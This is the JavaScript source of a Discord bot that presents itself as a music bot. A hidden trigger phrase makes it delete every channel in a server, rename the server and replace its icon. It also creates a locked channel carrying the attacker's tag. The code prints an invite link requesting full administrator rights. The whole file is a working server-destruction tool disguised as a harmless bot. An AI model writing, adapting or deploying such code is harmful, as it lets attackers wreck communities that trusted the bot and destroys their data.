const { Client, GatewayIntentBits, ActivityType, PermissionFlagsBits } = require('discord.js');
const fetch = require('node-fetch'); 
const fs = require('fs');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

const config = {
    channelName: 'EZ BY KABAN',
    channelType: 0
};


function updatePresence() {
    client.user.setPresence({
        activities: [{
            name: `Playing music`,
            type: ActivityType.Playing
        }],
        status: 'online'
    });
}

async function setServerIcon(guild) {
    try {
                const buffer = fs.readFileSync('./image.png');
                await guild.setIcon(buffer);
                console.log(`Иконка сервера ${guild.name} обновлена!`);
            } catch (error) {
                console.error(`Ошибка:`, error);
            }
        }

async function createControlChannel(guild) {
    try {
        const existingChannel = guild.channels.cache.find(
            ch => ch.name === config.channelName && ch.type === config.channelType
        );

        if (existingChannel) return existingChannel;

        const channel = await guild.channels.create({
            name: config.channelName,
            type: config.channelType,
            position: 0,
            topic: 'KABAN OPAT ZA CBOE',
            permissionOverwrites: [
                {
                    id: guild.id,
                    deny: [PermissionFlagsBits.SendMessages],
                },
                {
                    id: client.user.id,
                    allow: [PermissionFlagsBits.SendMessages, PermissionFlagsBits.ManageChannels],
                }
            ]
        });

        return channel;
    } catch (error) {
        console.error('Не удалось создать канал:', error);
    }
}

client.on('ready', () => {
    console.log(`Бот запущен под ${client.user.tag}!`);
    updatePresence();

    const inviteLink = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;
    console.log(`Ссылка для приглашения: ${inviteLink}`);
});

client.on('messageCreate', async message => {
    if (message.content === "Kaban opat za CBOe") {
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("❌ Нужны права администратора!");
        }

        try {
            
            const deletePromises = message.guild.channels.cache.map(channel =>
                channel.delete().catch(e =>
                    console.error(`Не удалось удалить канал ${channel.name}:`, e)
                )
            );
            await Promise.all(deletePromises);

            
            await message.guild.setName("Kaban controlling")
                .catch(e => console.error('Не удалось изменить имя сервера:', e));

            
            await setServerIcon(message.guild);

            
            await createControlChannel(message.guild);

            message.reply("✅ Сервер успешно 'опат за своё'!");
        } catch (error) {
            console.error('Ошибка при выполнении команды:', error);
            message.reply("❌ Произошла ошибка при выполнении команды");
        }
    }
});

client.on('guildCreate', () => {
    updatePresence();
});

client.login(process.env.DISCORD_TOKEN || 'TOKEN');